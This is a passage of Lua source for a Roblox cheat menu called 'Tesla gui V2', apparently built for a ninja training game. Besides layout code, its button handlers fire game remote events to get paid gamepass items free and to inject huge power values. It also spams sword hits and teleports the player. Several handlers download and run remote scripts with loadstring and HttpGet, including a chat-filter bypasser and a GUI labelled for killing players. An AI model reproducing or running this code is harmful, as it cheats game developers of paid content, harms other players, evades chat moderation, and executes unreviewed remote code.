RainbowShuriken.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowShuriken.BorderSizePixel = 0
RainbowShuriken.Position = UDim2.new(0.661202192, 0, 1.14388716, 0)
RainbowShuriken.Size = UDim2.new(0, 186, 0, 44)
RainbowShuriken.Font = Enum.Font.SourceSans
RainbowShuriken.Text = "Rainbow Shuriken"
RainbowShuriken.TextColor3 = Color3.fromRGB(255, 15, 91)
RainbowShuriken.TextSize = 14.000
RainbowShuriken.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("RainbowPass", "MetallicThrowingKnives")
end)

RainbowCloth.Name = "RainbowCloth"
RainbowCloth.Parent = GamepassLabel
RainbowCloth.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
RainbowCloth.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowCloth.BorderSizePixel = 0
RainbowCloth.Position = UDim2.new(0.322404385, 0, 1.14388716, 0)
RainbowCloth.Size = UDim2.new(0, 186, 0, 44)
RainbowCloth.Font = Enum.Font.SourceSans
RainbowCloth.Text = "Rainbow Cloth"
RainbowCloth.TextColor3 = Color3.fromRGB(230, 42, 255)
RainbowCloth.TextSize = 14.000
RainbowCloth.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("RainbowPass", "RainbowPackCloth")
end)

RainbowSword.Name = "RainbowSword"
RainbowSword.Parent = GamepassLabel
RainbowSword.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
RainbowSword.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowSword.BorderSizePixel = 0
RainbowSword.Position = UDim2.new(0, 0, 1.14388716, 0)
RainbowSword.Size = UDim2.new(0, 177, 0, 44)
RainbowSword.Font = Enum.Font.SourceSans
RainbowSword.Text = "Rainbow Sword"
RainbowSword.TextColor3 = Color3.fromRGB(255, 44, 139)
RainbowSword.TextSize = 14.000
RainbowSword.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("RainbowPass", "UnicornSword")
end)
VipCloth.Name = "VipCloth"
VipCloth.Parent = GamepassLabel
VipCloth.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
VipCloth.BorderColor3 = Color3.fromRGB(0, 0, 0)
VipCloth.BorderSizePixel = 0
VipCloth.Position = UDim2.new(0.446265936, 0, 1.95089924, 0)
VipCloth.Size = UDim2.new(0, 86, 0, 46)
VipCloth.Font = Enum.Font.SourceSans
VipCloth.Text = "Vip Cloth"
VipCloth.TextColor3 = Color3.fromRGB(255, 248, 37)
VipCloth.TextSize = 14.000
VipCloth.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "VipPackCloth")
end)

VipShuriken.Name = "VipShuriken"
VipShuriken.Parent = GamepassLabel
VipShuriken.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
VipShuriken.BorderColor3 = Color3.fromRGB(0, 0, 0)
VipShuriken.BorderSizePixel = 0
VipShuriken.Position = UDim2.new(0.306010932, 0, 1.95089924, 0)
VipShuriken.Size = UDim2.new(0, 77, 0, 46)
VipShuriken.Font = Enum.Font.SourceSans
VipShuriken.Text = "Vip Shuriken"
VipShuriken.TextColor3 = Color3.fromRGB(255, 248, 37)
VipShuriken.TextSize = 14.000
VipShuriken.MouseButton1Down:connect(function()
	game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("VipPass", "Chakra")
end)

PizzaPack.Name = "Pizza Pack"
PizzaPack.Parent = GamepassLabel
PizzaPack.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
PizzaPack.BorderColor3 = Color3.fromRGB(0, 0, 0)
PizzaPack.BorderSizePixel = 0
PizzaPack.Position = UDim2.new(0, 0, 2.38104272, 0)
PizzaPack.Size = UDim2.new(0, 549, 0, 42)
PizzaPack.Font = Enum.Font.SourceSans
PizzaPack.Text = "Pizza Pack"
PizzaPack.TextColor3 = Color3.fromRGB(244, 57, 11)
PizzaPack.TextSize = 14.000

VipPass.Name = "VipPass"
VipPass.Parent = GamepassLabel
VipPass.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
VipPass.BorderColor3 = Color3.fromRGB(0, 0, 0)
VipPass.BorderSizePixel = 0
VipPass.Position = UDim2.new(0, 0, 1.56071198, 0)
VipPass.Size = UDim2.new(0, 549, 0, 40)
VipPass.Font = Enum.Font.SourceSans
VipPass.Text = "Vip Pass"
VipPass.TextColor3 = Color3.fromRGB(216, 195, 40)
VipPass.TextSize = 14.000

TextGamepass.Name = "TextGamepass"
TextGamepass.Parent = GamepassLabel
TextGamepass.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
TextGamepass.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextGamepass.BorderSizePixel = 0
TextGamepass.Position = UDim2.new(0, 0, 0.442999989, 0)
TextGamepass.Size = UDim2.new(0, 549, 0, 25)
TextGamepass.Font = Enum.Font.SourceSans
TextGamepass.Text = "Tesla gui V2"
TextGamepass.TextColor3 = Color3.fromRGB(0, 0, 0)
TextGamepass.TextSize = 14.000

RainbowPass.Name = "RainbowPass"
RainbowPass.Parent = GamepassLabel
RainbowPass.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
RainbowPass.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowPass.BorderSizePixel = 0
RainbowPass.Position = UDim2.new(0, 0, 0.833649576, 0)
RainbowPass.Size = UDim2.new(0, 549, 0, 33)
RainbowPass.Font = Enum.Font.SourceSans
RainbowPass.Text = "Rainbow Gamepass"
RainbowPass.TextColor3 = Color3.fromRGB(218, 43, 231)
RainbowPass.TextSize = 14.000

GamepassesUpdate.Name = "GamepassesUpdate"
GamepassesUpdate.Parent = GamepassLabel
GamepassesUpdate.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
GamepassesUpdate.BorderColor3 = Color3.fromRGB(0, 0, 0)
GamepassesUpdate.BorderSizePixel = 0
GamepassesUpdate.Position = UDim2.new(0, 0, 3.18995237, 0)
GamepassesUpdate.Size = UDim2.new(0, 549, 0, 191)
GamepassesUpdate.Font = Enum.Font.SourceSans
GamepassesUpdate.Text = ""
GamepassesUpdate.TextColor3 = Color3.fromRGB(0, 0, 0)
GamepassesUpdate.TextSize = 14.000

Misc.Name = "Misc"
Misc.Parent = NinjaGui
Misc.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc.BorderSizePixel = 0
Misc.Position = UDim2.new(0.31400001, 0, 0.207000002, 0)
Misc.Size = UDim2.new(0, 549, 0, 527)
Misc.Visible = false

MiscLabel.Name = "MiscLabel"
MiscLabel.Parent = Misc
MiscLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MiscLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscLabel.BorderSizePixel = 0
MiscLabel.Size = UDim2.new(0, 549, 0, 104)
MiscLabel.Image = "http://www.roblox.com/asset/?id=8129478563"

tab4Misc.Name = "tab4Misc"
tab4Misc.Parent = MiscLabel
tab4Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab4Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab4Misc.BorderSizePixel = 0
tab4Misc.Position = UDim2.new(0.517304182, 0, 0.680561185, 0)
tab4Misc.Size = UDim2.new(0, 101, 0, 18)
tab4Misc.Font = Enum.Font.SourceSans
tab4Misc.Text = "Clothes"
tab4Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab4Misc.TextSize = 14.000

tab3Misc.Name = "tab3Misc"
tab3Misc.Parent = MiscLabel
tab3Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab3Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab3Misc.BorderSizePixel = 0
tab3Misc.Position = UDim2.new(0.333000004, 0, 0.681999981, 0)
tab3Misc.Size = UDim2.new(0, 101, 0, 17)
tab3Misc.Font = Enum.Font.SourceSans
tab3Misc.Text = "Swords"
tab3Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab3Misc.TextSize = 14.000

tab2Misc.Name = "tab2Misc"
tab2Misc.Parent = MiscLabel
tab2Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab2Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab2Misc.BorderSizePixel = 0
tab2Misc.Position = UDim2.new(0.160291433, 0, 0.68234396, 0)
tab2Misc.Size = UDim2.new(0, 95, 0, 18)
tab2Misc.Font = Enum.Font.SourceSans
tab2Misc.Text = "Combat"
tab2Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab2Misc.TextSize = 14.000

tab5Misc.Name = "tab5Misc"
tab5Misc.Parent = MiscLabel
tab5Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab5Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab5Misc.BorderSizePixel = 0
tab5Misc.Position = UDim2.new(0.700999975, 0, 0.680999994, 0)
tab5Misc.Size = UDim2.new(0, 101, 0, 17)
tab5Misc.Font = Enum.Font.SourceSans
tab5Misc.Text = "Gamepasses"
tab5Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab5Misc.TextSize = 14.000

tab6Misc.Name = "tab6Misc"
tab6Misc.Parent = MiscLabel
tab6Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab6Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6Misc.BorderSizePixel = 0
tab6Misc.Position = UDim2.new(0.885245919, 0, 0.680561185, 0)
tab6Misc.Size = UDim2.new(0, 63, 0, 18)
tab6Misc.Font = Enum.Font.SourceSans
tab6Misc.Text = "Misc"
tab6Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab6Misc.TextSize = 14.000

line1.Name = "line1"
line1.Parent = MiscLabel
line1.BackgroundColor3 = Color3.fromRGB(255, 79, 208)
line1.BorderColor3 = Color3.fromRGB(0, 0, 0)
line1.BorderSizePixel = 0
line1.Position = UDim2.new(0.488160282, 0, 0.838095248, 0)
line1.Size = UDim2.new(0, 7, 0, 439)
line1.Font = Enum.Font.SourceSans
line1.Text = ""
line1.TextColor3 = Color3.fromRGB(0, 0, 0)
line1.TextSize = 14.000

tab1Misc.Name = "tab1Misc"
tab1Misc.Parent = MiscLabel
tab1Misc.BackgroundColor3 = Color3.fromRGB(228, 93, 255)
tab1Misc.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab1Misc.BorderSizePixel = 0
tab1Misc.Position = UDim2.new(0, 0, 0.681999981, 0)
tab1Misc.Size = UDim2.new(0, 88, 0, 17)
tab1Misc.Font = Enum.Font.SourceSans
tab1Misc.Text = "about"
tab1Misc.TextColor3 = Color3.fromRGB(0, 0, 0)
tab1Misc.TextSize = 14.000

Exploits.Name = "Exploits"
Exploits.Parent = MiscLabel
Exploits.BackgroundColor3 = Color3.fromRGB(255, 79, 208)
Exploits.BorderColor3 = Color3.fromRGB(0, 0, 0)
Exploits.BorderSizePixel = 0
Exploits.Position = UDim2.new(0, 0, 0.833649576, 0)
Exploits.Size = UDim2.new(0, 272, 0, 11)
Exploits.Font = Enum.Font.SourceSans
Exploits.Text = "Exploits "
Exploits.TextColor3 = Color3.fromRGB(0, 0, 0)
Exploits.TextSize = 14.000

LbbText.Name = "LbbText"
LbbText.Parent = MiscLabel
LbbText.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
LbbText.BorderColor3 = Color3.fromRGB(0, 0, 0)
LbbText.BorderSizePixel = 0
LbbText.Position = UDim2.new(0.579234958, 0, 3.91511703, 0)
LbbText.Size = UDim2.new(0, 200, 0, 50)
LbbText.Font = Enum.Font.SourceSans
LbbText.Text = "Only Use Lbb for cbring(kill players)"
LbbText.TextColor3 = Color3.fromRGB(255, 255, 255)
LbbText.TextSize = 14.000

MiscFunctions.Name = "MiscFunctions"
MiscFunctions.Parent = MiscLabel
MiscFunctions.BackgroundColor3 = Color3.fromRGB(255, 79, 208)
MiscFunctions.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscFunctions.BorderSizePixel = 0
MiscFunctions.Position = UDim2.new(0.500910759, 0, 0.843173385, 0)
MiscFunctions.Size = UDim2.new(0, 274, 0, 11)
MiscFunctions.Font = Enum.Font.SourceSans
MiscFunctions.Text = "Misc  Functions"
MiscFunctions.TextColor3 = Color3.fromRGB(0, 0, 0)
MiscFunctions.TextSize = 14.000

MiscScripts.Name = "MiscScripts"
MiscScripts.Parent = MiscLabel
MiscScripts.BackgroundColor3 = Color3.fromRGB(255, 44, 100)
MiscScripts.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscScripts.BorderSizePixel = 0
MiscScripts.Position = UDim2.new(0.500910759, 0, 2.52952003, 0)
MiscScripts.Size = UDim2.new(0, 274, 0, 11)
MiscScripts.Font = Enum.Font.SourceSans
MiscScripts.Text = "Misc Scripts"
MiscScripts.TextColor3 = Color3.fromRGB(0, 0, 0)
MiscScripts.TextSize = 14.000

MiscText.Name = "MiscText"
MiscText.Parent = MiscLabel
MiscText.BackgroundColor3 = Color3.fromRGB(111, 48, 138)
MiscText.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscText.BorderSizePixel = 0
MiscText.Position = UDim2.new(0, 0, 0.442999989, 0)
MiscText.Size = UDim2.new(0, 549, 0, 25)
MiscText.Font = Enum.Font.SourceSans
MiscText.Text = "Tesla gui V2"
MiscText.TextColor3 = Color3.fromRGB(0, 0, 0)
MiscText.TextSize = 14.000

Text42.Name = "Text42"
Text42.Parent = MiscLabel
Text42.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Text42.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text42.BorderSizePixel = 0
Text42.Position = UDim2.new(0.0418943539, 0, 2.62848115, 0)
Text42.Size = UDim2.new(0, 224, 0, 82)
Text42.Font = Enum.Font.SourceSans
Text42.Text = "On Auto Farm Mode you will be teleported far away"
Text42.TextColor3 = Color3.fromRGB(241, 241, 241)
Text42.TextSize = 14.000

Text43.Name = "Text43"
Text43.Parent = MiscLabel
Text43.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Text43.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text43.BorderSizePixel = 0
Text43.Position = UDim2.new(0.0637522787, 0, 3.08654618, 0)
Text43.Size = UDim2.new(0, 200, 0, 45)
Text43.Font = Enum.Font.SourceSans
Text43.Text = "and will auto equip the train sword"
Text43.TextColor3 = Color3.fromRGB(255, 255, 255)
Text43.TextSize = 14.000

Text44.Name = "Text44"
Text44.Parent = MiscLabel
Text44.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
Text44.BorderColor3 = Color3.fromRGB(0, 0, 0)
Text44.BorderSizePixel = 0
Text44.Position = UDim2.new(0.0637522787, 0, 3.40312672, 0)
Text44.Size = UDim2.new(0, 200, 0, 40)
Text44.Font = Enum.Font.SourceSans
Text44.Text = "it only turn off if u rejoin"
Text44.TextColor3 = Color3.fromRGB(255, 255, 255)
Text44.TextSize = 14.000

line2.Name = "line2"
line2.Parent = MiscLabel
line2.BackgroundColor3 = Color3.fromRGB(255, 79, 208)
line2.BorderColor3 = Color3.fromRGB(0, 0, 0)
line2.BorderSizePixel = 0
line2.Position = UDim2.new(0, 0, 2.46861839, 0)
line2.Size = UDim2.new(0, 549, 0, 7)
line2.Font = Enum.Font.SourceSans
line2.Text = ""
line2.TextColor3 = Color3.fromRGB(0, 0, 0)
line2.TextSize = 14.000

NegativeNin.Name = "NegativeNin"
NegativeNin.Parent = MiscLabel
NegativeNin.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
NegativeNin.BorderColor3 = Color3.fromRGB(0, 0, 0)
NegativeNin.BorderSizePixel = 0
NegativeNin.Position = UDim2.new(0.298724949, 0, 1.99468708, 0)
NegativeNin.Size = UDim2.new(0, 104, 0, 49)
NegativeNin.Font = Enum.Font.SourceSans
NegativeNin.Text = "Negative Ninjutsu"
NegativeNin.TextColor3 = Color3.fromRGB(241, 241, 241)
NegativeNin.TextSize = 14.000
NegativeNin.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
NegativeNin.MouseButton1Down:connect(function()
	local rs = game:GetService("ReplicatedStorage")
	while wait(0.72) do
		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -2000000000000000000000000000000000000000000000000)
		wait(0.72)
		rs.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -19916241294912496129491248999999.99) 
	end 
end)

AntiAfk.Name = "AntiAfk"
AntiAfk.Parent = MiscLabel
AntiAfk.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
AntiAfk.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiAfk.BorderSizePixel = 0
AntiAfk.Position = UDim2.new(0.82695812, 0, 1.99468696, 0)
AntiAfk.Size = UDim2.new(0, 95, 0, 49)
AntiAfk.Font = Enum.Font.SourceSans
AntiAfk.Text = "Anti Afk"
AntiAfk.TextColor3 = Color3.fromRGB(241, 241, 241)
AntiAfk.TextSize = 14.000
AntiAfk.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
AntiAfk.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AdamantiunGG/NinjaAssasinMainScript/main/anti%20afk", true))()
end)

AutoFarmMode.Name = "AutoFarmMode"
AutoFarmMode.Parent = MiscLabel
AutoFarmMode.BackgroundColor3 = Color3.fromRGB(227, 7, 102)
AutoFarmMode.BorderColor3 = Color3.fromRGB(0, 0, 0)
AutoFarmMode.BorderSizePixel = 0
AutoFarmMode.Position = UDim2.new(0.0655737668, 0, 3.90759921, 0)
AutoFarmMode.Size = UDim2.new(0, 200, 0, 50)
AutoFarmMode.Font = Enum.Font.SourceSans
AutoFarmMode.Text = "Auto Farm Mode"
AutoFarmMode.TextColor3 = Color3.fromRGB(0, 0, 0)
AutoFarmMode.TextSize = 14.000
AutoFarmMode.MouseButton1Down:connect(function()
	
		game.StarterGui:SetCore("SendNotification", {
		Title = "Tesla Gui";
			Text = "Now Just Press AutoFarm";
			Duration = 15;
		})
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AdamantiunGG/NinjaAssasinMainScript/main/anti%20afk", true))()

	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(600000, 600001, 600000)
	wait()

	wait(1)
	while wait() do
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v.name == "Train" then
				v.Parent = game.Players.LocalPlayer.Character
			end
		end
	end
end)


AutoTrain.Name = "AutoTrain"
AutoTrain.Parent = MiscLabel
AutoTrain.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
AutoTrain.BorderColor3 = Color3.fromRGB(0, 0, 0)
AutoTrain.BorderSizePixel = 0
AutoTrain.Position = UDim2.new(0, 0, 0.940236688, 0)
AutoTrain.Size = UDim2.new(0, 95, 0, 45)
AutoTrain.Font = Enum.Font.SourceSans
AutoTrain.Text = "Auto Train"
AutoTrain.TextColor3 = Color3.fromRGB(241, 241, 241)
AutoTrain.TextSize = 14.000
AutoTrain.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
AutoTrain.MouseButton1Down:connect(function()
	Autofarm()
end)

ChatBypasser.Name = "ChatBypasser"
ChatBypasser.Parent = MiscLabel
ChatBypasser.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
ChatBypasser.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatBypasser.BorderSizePixel = 0
ChatBypasser.Position = UDim2.new(0.500910759, 0, 2.63528919, 0)
ChatBypasser.Size = UDim2.new(0, 95, 0, 48)
ChatBypasser.Font = Enum.Font.SourceSans
ChatBypasser.Text = "Chat Bypasser"
ChatBypasser.TextColor3 = Color3.fromRGB(241, 241, 241)
ChatBypasser.TextSize = 14.000
ChatBypasser.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
ChatBypasser.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
end)
FastSword.Name = "FastSword"
FastSword.Parent = MiscLabel
FastSword.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
FastSword.BorderColor3 = Color3.fromRGB(0, 0, 0)
FastSword.BorderSizePixel = 0
FastSword.Position = UDim2.new(0.311475396, 0, 0.940236688, 0)
FastSword.Size = UDim2.new(0, 97, 0, 45)
FastSword.Font = Enum.Font.SourceSans
FastSword.Text = "Fast Sword"
FastSword.TextColor3 = Color3.fromRGB(241, 241, 241)
FastSword.TextSize = 14.000
FastSword.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
FastSword.MouseButton1Down:connect(function()
	while true do

		game:GetService("Players").LocalPlayer.Character.Sword.HitEvent:FireServer()

		wait(0.1)end
end)
InfiniteYield.Name = "InfiniteYield"
InfiniteYield.Parent = MiscLabel
InfiniteYield.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
InfiniteYield.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYield.BorderSizePixel = 0
InfiniteYield.Position = UDim2.new(0.82695812, 0, 2.63528919, 0)
InfiniteYield.Size = UDim2.new(0, 95, 0, 48)
InfiniteYield.Font = Enum.Font.SourceSans
InfiniteYield.Text = "If Yield"
InfiniteYield.TextColor3 = Color3.fromRGB(241, 241, 241)
InfiniteYield.TextSize = 14.000
InfiniteYield.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
InfiniteYield.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)
LbbGui.Name = "LbbGui"
LbbGui.Parent = MiscLabel
LbbGui.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
LbbGui.BorderColor3 = Color3.fromRGB(0, 0, 0)
LbbGui.BorderSizePixel = 0
LbbGui.Position = UDim2.new(0.604735911, 0, 4.37952471, 0)
LbbGui.Size = UDim2.new(0, 171, 0, 49)
LbbGui.Font = Enum.Font.SourceSans
LbbGui.Text = "LbbGui"
LbbGui.TextColor3 = Color3.fromRGB(241, 241, 241)
LbbGui.TextSize = 14.000
LbbGui.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
LbbGui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AdamantiunGG/RandomScripts/main/LbbGui",true))()
end)
RainbowYan.Name = "RainbowYan"
RainbowYan.Parent = MiscLabel
RainbowYan.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
RainbowYan.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowYan.BorderSizePixel = 0
RainbowYan.Position = UDim2.new(0.82695812, 0, 0.948942304, 0)
RainbowYan.Size = UDim2.new(0, 95, 0, 44)
RainbowYan.Font = Enum.Font.SourceSans
RainbowYan.Text = "Rainbow yang"
RainbowYan.TextColor3 = Color3.fromRGB(241, 241, 241)
RainbowYan.TextSize = 14.000
RainbowYan.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
RainbowYan.MouseButton1Down:connect(function()
	while true do
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang19") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang18") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang17") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang16") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang15") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang14") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang13") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang12") 
		wait(0.18)
	end

end)

RainbowYin.Name = "RainbowYin"
RainbowYin.Parent = MiscLabel
RainbowYin.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
RainbowYin.BorderColor3 = Color3.fromRGB(0, 0, 0)
RainbowYin.BorderSizePixel = 0
RainbowYin.Position = UDim2.new(0.500910759, 0, 0.948942304, 0)
RainbowYin.Size = UDim2.new(0, 95, 0, 44)
RainbowYin.Font = Enum.Font.SourceSans
RainbowYin.Text = "Rainbow yin"
RainbowYin.TextColor3 = Color3.fromRGB(241, 241, 241)
RainbowYin.TextSize = 14.000
RainbowYin.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
RainbowYin.MouseButton1Down:connect(function()
	while true do
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying19")
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying18") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying17") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying16") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying15") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying14") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying13") 
		wait(0.18)
		game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying12") 
		wait(0.18)
	end
end)

Respawn.Name = "Respawn"
Respawn.Parent = MiscLabel
Respawn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
Respawn.BorderColor3 = Color3.fromRGB(0, 0, 0)
Respawn.BorderSizePixel = 0
Respawn.Position = UDim2.new(0, 0, 1.99468708, 0)
Respawn.Size = UDim2.new(0, 95, 0, 49)
Respawn.Font = Enum.Font.SourceSans
Respawn.Text = "Respawn"
Respawn.TextColor3 = Color3.fromRGB(241, 241, 241)
Respawn.TextSize = 14.000
Respawn.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
Respawn.MouseButton1Down:connect(function()
	game:GetService("ReplicatedStorage").RemoteEvent.SpawnCharacterEvent:FireServer("MainSpawn")
end)

local Pos = {}

SafeSpot.Name = "SafeSpot"
SafeSpot.Parent = MiscLabel
SafeSpot.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
SafeSpot.BorderColor3 = Color3.fromRGB(0, 0, 0)
SafeSpot.BorderSizePixel = 0
SafeSpot.Position = UDim2.new(0.500910759, 0, 1.99468708, 0)
SafeSpot.Size = UDim2.new(0, 95, 0, 49)
SafeSpot.Font = Enum.Font.SourceSans
SafeSpot.Text = "Safe Spot"
SafeSpot.TextColor3 = Color3.fromRGB(241, 241, 241)
SafeSpot.TextSize = 14.000
SafeSpot.TextStrokeColor3 = Color3.fromRGB(129, 129, 129)
SafeSpot.MouseButton1Down:connect(function()
	    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(600000, 600001, 600000)
end)

local function LFKJCS_fake_script() -- NinjaGui.Script 
	local script = Instance.new('Script', NinjaGui)



	tab4.MouseButton1Down:connect(function()
		Closeall() clothes.Visible = true  
	end)

	tab3.MouseButton1Down:connect(function()
		Closeall() Swords.Visible = true  
	end)

	tab2.MouseButton1Down:connect(function()
		Closeall() combat.Visible = true 
	end)

	tab1.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui";
			Text = "You're arealdy on About Tab";
			Duration = 7;
		})
	end)

	tab5.MouseButton1Down:connect(function()
		Closeall() Gamepasses.Visible = true 
	end)

	tab6.MouseButton1Down:connect(function()
		Closeall() Misc.Visible = true  
	end)



	Open.MouseButton1Down:connect(function()

		if about.Visible == false
		then

			about.Visible = true 

			Open.Text = "Close"
			if text == "close" then
				Closeall()
			end
		else 
			Closeall()
			Open.Text = "Open"
		end


	end)

	tab4com.MouseButton1Down:connect(function()
		Closeall() clothes.Visible = true  
	end)

	tab3com.MouseButton1Down:connect(function()
		Closeall()  Swords.Visible = true 
	end)

	tab2com.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui.";
			Text = "You're Arealdy On Combat Tab";
			Duration = 7;
		})
	end)

	tab1Com.MouseButton1Down:connect(function()
		Closeall() about.Visible = true 
	end)

	tab5com.MouseButton1Down:connect(function()
		Closeall() Gamepasses.Visible = true 
	end)

	tab6com.MouseButton1Down:connect(function()
		Closeall() Misc.Visible = true 
	end)

	tab4s.MouseButton1Down:connect(function()
		Closeall() clothes.Visible = true 
	end)

	tab3s.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui";
			Text = "You're Arealdy On Swords Tab";
			Duration = 7;
		})
	end)

	tab2s.MouseButton1Down:connect(function()
		Closeall() combat.Visible = true 
	end)

	tab1S.MouseButton1Down:connect(function()
		Closeall() about.Visible = true 
	end)

	tab5s.MouseButton1Down:connect(function()
		Closeall() Gamepasses.Visible = true
	end)

	tab6s.MouseButton1Down:connect(function()
		Closeall() Misc.Visible = true 
	end)

	tab4cl.MouseButton1Down:connect(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "Tesla Gui";
			Text = "You're Arealdy On Clothes Tab";
			Duration = 7;
		})
	end)

	tab3cl.MouseButton1Down:connect(function()
		Closeall() Swords.Visible = true 
	end)
	tab2cl.MouseButton1Down:connect(function()
		Closeall() combat.Visible = true
	end)

	tab1Cl.MouseButton1Down:connect(function()
		Closeall() about.Visible = true
	end)

	tab5cl.MouseButton1Down:connect(function()
